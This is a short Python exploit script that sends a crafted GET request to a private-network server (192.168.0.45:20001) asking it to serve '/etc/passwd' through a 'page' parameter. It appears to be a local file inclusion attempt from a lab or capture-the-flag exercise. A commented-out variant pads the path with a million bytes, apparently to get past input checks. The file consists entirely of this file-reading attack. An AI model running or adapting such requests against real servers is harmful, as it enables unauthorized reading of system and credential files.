import requests
from io import BytesIO

files = {
  'num' : '%092',
#   'page': BytesIO(b'/etc/passwd' + b'a' * 1000000)
  'page':'/etc/passwd'
}

res = requests.get('http://192.168.0.45:20001/', params=files, allow_redirects=True)
print(res.text)